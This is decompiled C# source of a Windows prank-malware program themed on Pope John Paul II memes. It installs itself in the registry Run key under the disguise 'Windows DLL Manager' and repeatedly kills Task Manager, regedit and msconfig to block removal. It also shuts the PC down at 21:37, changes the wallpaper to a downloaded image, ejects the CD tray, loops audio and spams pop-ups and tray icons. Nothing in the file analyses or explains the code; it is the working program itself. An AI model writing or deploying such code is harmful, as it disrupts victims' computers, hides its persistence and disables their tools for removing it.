using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using rndll86.My;
using rndll86.My.Resources;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace rndll86
{
	[DesignerGenerated]
	public class Form1 : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("Timer2")]
		private Timer _Timer2;

		[AccessedThroughProperty("NotifyIcon1")]
		private NotifyIcon _NotifyIcon1;

		[AccessedThroughProperty("NotifyIcon2")]
		private NotifyIcon _NotifyIcon2;

		[AccessedThroughProperty("NotifyIcon3")]
		private NotifyIcon _NotifyIcon3;

		[AccessedThroughProperty("NotifyIcon4")]
		private NotifyIcon _NotifyIcon4;

		[AccessedThroughProperty("NotifyIcon5")]
		private NotifyIcon _NotifyIcon5;

		[AccessedThroughProperty("NotifyIcon6")]
		private NotifyIcon _NotifyIcon6;

		[AccessedThroughProperty("NotifyIcon7")]
		private NotifyIcon _NotifyIcon7;

		[AccessedThroughProperty("NotifyIcon8")]
		private NotifyIcon _NotifyIcon8;

		[AccessedThroughProperty("NotifyIcon9")]
		private NotifyIcon _NotifyIcon9;

		[AccessedThroughProperty("NotifyIcon10")]
		private NotifyIcon _NotifyIcon10;

		[AccessedThroughProperty("NotifyIcon11")]
		private NotifyIcon _NotifyIcon11;

		[AccessedThroughProperty("NotifyIcon12")]
		private NotifyIcon _NotifyIcon12;

		[AccessedThroughProperty("NotifyIcon13")]
		private NotifyIcon _NotifyIcon13;

		[AccessedThroughProperty("NotifyIcon14")]
		private NotifyIcon _NotifyIcon14;

		[AccessedThroughProperty("NotifyIcon15")]
		private NotifyIcon _NotifyIcon15;

		[AccessedThroughProperty("NotifyIcon16")]
		private NotifyIcon _NotifyIcon16;

		[AccessedThroughProperty("Timer3")]
		private Timer _Timer3;

		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		[AccessedThroughProperty("Timer4")]
		private Timer _Timer4;

		[AccessedThroughProperty("Timer5")]
		private Timer _Timer5;

		[AccessedThroughProperty("Timer6")]
		private Timer _Timer6;

		[AccessedThroughProperty("Timer7")]
		private Timer _Timer7;

		private const int SETDESKWALLPAPER = 20;

		private const int UPDATEINIFILE = 1;

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return _Timer1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = Timer1_Tick;
				if (_Timer1 != null)
				{
					_Timer1.Tick -= value2;
				}
				_Timer1 = value;
				if (_Timer1 != null)
				{
					_Timer1.Tick += value2;
				}
			}
		}

		internal virtual Timer Timer2
		{
			[DebuggerNonUserCode]
			get
			{
				return _Timer2;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = Timer2_Tick;
				if (_Timer2 != null)
				{
					_Timer2.Tick -= value2;
				}
				_Timer2 = value;
				if (_Timer2 != null)
				{
					_Timer2.Tick += value2;
				}
			}
		}

		internal virtual NotifyIcon NotifyIcon1
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon1 = value;
			}
		}

		internal virtual NotifyIcon NotifyIcon2
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon2;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon2 = value;
			}
		}

		internal virtual NotifyIcon NotifyIcon3
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon3;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon3 = value;
			}
		}

		internal virtual NotifyIcon NotifyIcon4
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon4;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon4 = value;
			}
		}

		internal virtual NotifyIcon NotifyIcon5
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon5;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon5 = value;
			}
		}

		internal virtual NotifyIcon NotifyIcon6
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon6;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon6 = value;
			}
		}

		internal virtual NotifyIcon NotifyIcon7
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon7;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon7 = value;
			}
		}

		internal virtual NotifyIcon NotifyIcon8
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon8;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon8 = value;
			}
		}

		internal virtual NotifyIcon NotifyIcon9
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon9;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon9 = value;
			}
		}

		internal virtual NotifyIcon NotifyIcon10
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon10;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon10 = value;
			}
		}

		internal virtual NotifyIcon NotifyIcon11
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon11;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon11 = value;
			}
		}

		internal virtual NotifyIcon NotifyIcon12
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon12;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon12 = value;
			}
		}

		internal virtual NotifyIcon NotifyIcon13
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon13;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon13 = value;
			}
		}

		internal virtual NotifyIcon NotifyIcon14
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon14;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon14 = value;
			}
		}

		internal virtual NotifyIcon NotifyIcon15
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon15;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon15 = value;
			}
		}

		internal virtual NotifyIcon NotifyIcon16
		{
			[DebuggerNonUserCode]
			get
			{
				return _NotifyIcon16;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_NotifyIcon16 = value;
			}
		}

		internal virtual Timer Timer3
		{
			[DebuggerNonUserCode]
			get
			{
				return _Timer3;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = Timer3_Tick;
				if (_Timer3 != null)
				{
					_Timer3.Tick -= value2;
				}
				_Timer3 = value;
				if (_Timer3 != null)
				{
					_Timer3.Tick += value2;
				}
			}
		}

		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return _PictureBox1;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				_PictureBox1 = value;
			}
		}

		internal virtual Timer Timer4
		{
			[DebuggerNonUserCode]
			get
			{
				return _Timer4;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = Timer4_Tick;
				if (_Timer4 != null)
				{
					_Timer4.Tick -= value2;
				}
				_Timer4 = value;
				if (_Timer4 != null)
				{
					_Timer4.Tick += value2;
				}
			}
		}

		internal virtual Timer Timer5
		{
			[DebuggerNonUserCode]
			get
			{
				return _Timer5;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = Timer5_Tick;
				if (_Timer5 != null)
				{
					_Timer5.Tick -= value2;
				}
				_Timer5 = value;
				if (_Timer5 != null)
				{
					_Timer5.Tick += value2;
				}
			}
		}

		internal virtual Timer Timer6
		{
			[DebuggerNonUserCode]
			get
			{
				return _Timer6;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = Timer6_Tick;
				if (_Timer6 != null)
				{
					_Timer6.Tick -= value2;
				}
				_Timer6 = value;
				if (_Timer6 != null)
				{
					_Timer6.Tick += value2;
				}
			}
		}

		internal virtual Timer Timer7
		{
			[DebuggerNonUserCode]
			get
			{
				return _Timer7;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler value2 = Timer7_Tick;
				if (_Timer7 != null)
				{
					_Timer7.Tick -= value2;
				}
				_Timer7 = value;
				if (_Timer7 != null)
				{
					_Timer7.Tick += value2;
				}
			}
		}

		[DebuggerNonUserCode]
		public Form1()
		{
			base.Load += Form1_Load;
			__ENCAddToList(this);
			InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			checked
			{
				lock (__ENCList)
				{
					if (__ENCList.Count == __ENCList.Capacity)
					{
						int num = 0;
						int num2 = __ENCList.Count - 1;
						int num3 = 0;
						while (true)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							WeakReference weakReference = __ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									__ENCList[num] = __ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						__ENCList.RemoveRange(num, __ENCList.Count - num);
						__ENCList.Capacity = __ENCList.Count;
					}
					__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if ((disposing && components != null) ? true : false)
				{
					components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(rndll86.Form1));
			Timer1 = new System.Windows.Forms.Timer(components);
			Timer2 = new System.Windows.Forms.Timer(components);
			NotifyIcon1 = new System.Windows.Forms.NotifyIcon(components);
			NotifyIcon2 = new System.Windows.Forms.NotifyIcon(components);
			NotifyIcon3 = new System.Windows.Forms.NotifyIcon(components);
			NotifyIcon4 = new System.Windows.Forms.NotifyIcon(components);
			NotifyIcon5 = new System.Windows.Forms.NotifyIcon(components);
			NotifyIcon6 = new System.Windows.Forms.NotifyIcon(components);
			NotifyIcon7 = new System.Windows.Forms.NotifyIcon(components);
			NotifyIcon8 = new System.Windows.Forms.NotifyIcon(components);
			NotifyIcon9 = new System.Windows.Forms.NotifyIcon(components);
			NotifyIcon10 = new System.Windows.Forms.NotifyIcon(components);
			NotifyIcon11 = new System.Windows.Forms.NotifyIcon(components);
			NotifyIcon12 = new System.Windows.Forms.NotifyIcon(components);
			NotifyIcon13 = new System.Windows.Forms.NotifyIcon(components);
			NotifyIcon14 = new System.Windows.Forms.NotifyIcon(components);
			NotifyIcon15 = new System.Windows.Forms.NotifyIcon(components);
			NotifyIcon16 = new System.Windows.Forms.NotifyIcon(components);
			Timer3 = new System.Windows.Forms.Timer(components);
			PictureBox1 = new System.Windows.Forms.PictureBox();
			Timer4 = new System.Windows.Forms.Timer(components);
			Timer5 = new System.Windows.Forms.Timer(components);
			Timer6 = new System.Windows.Forms.Timer(components);
			Timer7 = new System.Windows.Forms.Timer(components);
			((System.ComponentModel.ISupportInitialize)PictureBox1).BeginInit();
			SuspendLayout();
			Timer2.Interval = 15000;
			NotifyIcon1.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon1.Icon");
			NotifyIcon1.Text = "i co teraz kurwa";
			NotifyIcon1.Visible = true;
			NotifyIcon2.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon2.Icon");
			NotifyIcon2.Text = "i co teraz kurwa";
			NotifyIcon2.Visible = true;
			NotifyIcon3.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon3.Icon");
			NotifyIcon3.Text = "i co teraz kurwa";
			NotifyIcon3.Visible = true;
			NotifyIcon4.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon4.Icon");
			NotifyIcon4.Text = "i co teraz kurwa";
			NotifyIcon4.Visible = true;
			NotifyIcon5.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon5.Icon");
			NotifyIcon5.Text = "i co teraz kurwa";
			NotifyIcon5.Visible = true;
			NotifyIcon6.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon6.Icon");
			NotifyIcon6.Text = "i co teraz kurwa";
			NotifyIcon6.Visible = true;
			NotifyIcon7.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon7.Icon");
			NotifyIcon7.Text = "i co teraz kurwa";
			NotifyIcon7.Visible = true;
			NotifyIcon8.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon8.Icon");
			NotifyIcon8.Text = "i co teraz kurwa";
			NotifyIcon8.Visible = true;
			NotifyIcon9.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon9.Icon");
			NotifyIcon9.Text = "kremówking";
			NotifyIcon9.Visible = true;
			NotifyIcon10.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon10.Icon");
			NotifyIcon10.Text = "kremówking";
			NotifyIcon10.Visible = true;
			NotifyIcon11.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon11.Icon");
			NotifyIcon11.Text = "kremówking";
			NotifyIcon11.Visible = true;
			NotifyIcon12.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon12.Icon");
			NotifyIcon12.Text = "kremówking";
			NotifyIcon12.Visible = true;
			NotifyIcon13.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon13.Icon");
			NotifyIcon13.Text = "kremówking";
			NotifyIcon13.Visible = true;
			NotifyIcon14.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon14.Icon");
			NotifyIcon14.Text = "kremówking";
			NotifyIcon14.Visible = true;
			NotifyIcon15.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon15.Icon");
			NotifyIcon15.Text = "kremówking";
			NotifyIcon15.Visible = true;
			NotifyIcon16.Icon = (System.Drawing.Icon)resources.GetObject("NotifyIcon16.Icon");
			NotifyIcon16.Text = "kremówking";
			NotifyIcon16.Visible = true;
			Timer3.Interval = 600000;
			PictureBox1.Image = rndll86.My.Resources.Resources._11165220_871252142916802_1002301553187624596_n;
			System.Drawing.Point point2 = PictureBox1.Location = new System.Drawing.Point(79, 4);
			PictureBox1.Name = "PictureBox1";
			System.Drawing.Size size2 = PictureBox1.Size = new System.Drawing.Size(100, 50);
			PictureBox1.TabIndex = 0;
			PictureBox1.TabStop = false;
			Timer5.Interval = 15000;
			Timer6.Interval = 900000;
			Timer7.Interval = 60000;
			System.Drawing.SizeF sizeF2 = AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			size2 = (ClientSize = new System.Drawing.Size(116, 0));
			Controls.Add(PictureBox1);
			Name = "Form1";
			ShowIcon = false;
			ShowInTaskbar = false;
			Text = "Form1";
			WindowState = System.Windows.Forms.FormWindowState.Minimized;
			((System.ComponentModel.ISupportInitialize)PictureBox1).EndInit();
			ResumeLayout(false);
		}

		[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SystemParametersInfoA", ExactSpelling = true, SetLastError = true)]
		private static extern int SystemParametersInfo(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

		[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mciSendStringA", ExactSpelling = true, SetLastError = true)]
		private static extern long mciSendString([MarshalAs(UnmanagedType.VBByRefStr)] ref string Command, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ReturnString, long ReturnLength, long hWnd);

		private void changewallp()
		{
			if (!File.Exists(Application.StartupPath.ToString() + "FzGMM7P.jpg"))
			{
				MyProject.Computer.Network.DownloadFile("http://i.imgur.com/FzGMM7P.jpg", Application.StartupPath.ToString() + "FzGMM7P.jpg");
			}
			string lpvParam = Application.StartupPath.ToString() + "\\FzGMM7P.jpg";
			try
			{
				PictureBox1.BackgroundImage = Image.FromFile(lpvParam);
				PictureBox1.BackgroundImageLayout = ImageLayout.Stretch;
				SystemParametersInfo(20, 0, ref lpvParam, 1);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		private void Form1_Load(object sender, EventArgs e)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Windows DLL Manager", Application.ExecutablePath.ToString());
			File.AppendAllText("C:\\Users\\" + Environment.UserName.ToString() + "\\Desktop\\Podziemia Watykanu.txt", Resources.vatican + "\r\n");
			File.AppendAllText("C:\\Users\\" + Environment.UserName.ToString() + "\\Desktop\\Podziemia Watykanu.txt", Resources.vatican + "\r\n");
			File.AppendAllText("C:\\Users\\" + Environment.UserName.ToString() + "\\Desktop\\Podziemia Watykanu.txt", Resources.vatican + "\r\n");
			Timer1.Start();
			Timer2.Start();
			Timer3.Start();
			Timer4.Start();
			Timer5.Start();
			Timer6.Start();
			Timer7.Start();
			changewallp();
			Interaction.MsgBox("Damn, something went wrong! Contact me via mail with error code if you want to fix that problem. Mail: juanpablo2137@heaven.com", MsgBoxStyle.Critical, "Error 0x0001");
			MyProject.Computer.Audio.Play(Resources.barking, AudioPlayMode.BackgroundLoop);
			NotifyIcon1.Visible = true;
			NotifyIcon2.Visible = true;
			NotifyIcon3.Visible = true;
			NotifyIcon4.Visible = true;
			NotifyIcon5.Visible = true;
			NotifyIcon6.Visible = true;
			NotifyIcon7.Visible = true;
			NotifyIcon8.Visible = true;
			NotifyIcon9.Visible = true;
			NotifyIcon10.Visible = true;
			NotifyIcon11.Visible = true;
			NotifyIcon12.Visible = true;
			NotifyIcon13.Visible = true;
			NotifyIcon14.Visible = true;
			NotifyIcon15.Visible = true;
			NotifyIcon16.Visible = true;
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName("Taskmgr");
				foreach (Process process in processesByName)
				{
					process.Kill();
				}
				Process[] processesByName2 = Process.GetProcessesByName("taskmgr");
				foreach (Process process2 in processesByName2)
				{
					process2.Kill();
				}
				Process[] processesByName3 = Process.GetProcessesByName("TASKMGR");
				foreach (Process process3 in processesByName3)
				{
					process3.Kill();
				}
				Process[] processesByName4 = Process.GetProcessesByName("regedit");
				foreach (Process process4 in processesByName4)
				{
					process4.Kill();
				}
				Process[] processesByName5 = Process.GetProcessesByName("Regedit");
				foreach (Process process5 in processesByName5)
				{
					process5.Kill();
				}
				Process[] processesByName6 = Process.GetProcessesByName("REGEDIT");
				foreach (Process process6 in processesByName6)
				{
					process6.Kill();
				}
				Process[] processesByName7 = Process.GetProcessesByName("msconfig");
				foreach (Process process7 in processesByName7)
				{
					process7.Kill();
				}
				Process[] processesByName8 = Process.GetProcessesByName("Msconfig");
				foreach (Process process8 in processesByName8)
				{
					process8.Kill();
				}
				Process[] processesByName9 = Process.GetProcessesByName("MSCONFIG");
				foreach (Process process9 in processesByName9)
				{
					process9.Kill();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		private void Timer2_Tick(object sender, EventArgs e)
		{
			Random random = new Random();
			int num = random.Next(1, 4);
			if (num == 1)
			{
				MyProject.Forms.rek1.Show();
			}
			if (num == 2)
			{
				MyProject.Forms.rek2.Show();
			}
			if (num == 3)
			{
				MyProject.Forms.rek3.Show();
			}
			if (num == 4)
			{
				MyProject.Forms.rek4.Show();
			}
		}

		private void Timer3_Tick(object sender, EventArgs e)
		{
			MyProject.Computer.Audio.Play(Resources._11, AudioPlayMode.Background);
		}

		private void Timer4_Tick(object sender, EventArgs e)
		{
			string left = DateTime.Now.ToLongTimeString();
			if (Operators.CompareString(left, "21:37:00", TextCompare: false) == 0)
			{
				Interaction.Shell("shutdown -s");
			}
		}

		private void Timer5_Tick(object sender, EventArgs e)
		{
			try
			{
				string Command = "set cdaudio door open";
				string ReturnString = Conversions.ToString(0);
				mciSendString(ref Command, ref ReturnString, 0L, 0L);
				Interaction.MsgBox("Insert Kremówka", MsgBoxStyle.OkOnly, "Jan Paweł II - Aplikacja");
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}

		private void Timer6_Tick(object sender, EventArgs e)
		{
			MyProject.Forms.fullscreen.Show();
		}

		private void Timer7_Tick(object sender, EventArgs e)
		{
			MyProject.Forms.lataj_kurde.Show();
		}
	}
}
